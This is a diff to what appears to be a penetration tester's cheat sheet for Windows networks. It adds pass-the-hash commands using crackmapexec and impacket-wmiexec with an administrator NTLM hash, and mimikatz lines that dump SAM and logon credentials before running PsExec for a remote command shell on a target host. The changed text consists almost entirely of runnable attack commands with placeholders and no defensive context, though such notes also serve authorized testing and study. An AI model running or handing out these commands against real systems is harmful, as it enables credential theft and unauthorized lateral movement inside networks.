@@ -170,10 +170,11 @@ Mount windows share:
 sudo mount -o username=$USER,password=$PASSWORD -t cifs \\\\$TARGET_IP\$SHARE /mnt
 ```
 
-wmiexec with hash:
-#pass-the-hash #pth 
+wmiexec (on port 445) with hash (administrator account only):
+#pass-the-hash #pth #wmiexec
 ```bash
 crackmapexec smb -u administrator -H $HASH -X "powershell -e ..."
+impacket-wmiexec -hashes :$HASH Administrator@$TARGET_IP
 ```
 smbclient:
 #pass-the-hash 
@@ -237,6 +238,13 @@ privilege::debug
 token::elevate
 lsadump::sam
 sekurlsa::logonpasswords
+```
+
+```powershell
+sekurlsa::pth /user:$USER /domain:$TARGET_DOMAIN /ntlm:$HASH /run:powershell
+#on the new powershell
+net use \\$TARGET_IP
+.\PsExec.exe \\$TARGET_IP cmd
 ```
 
 mimikatz as domain admin:
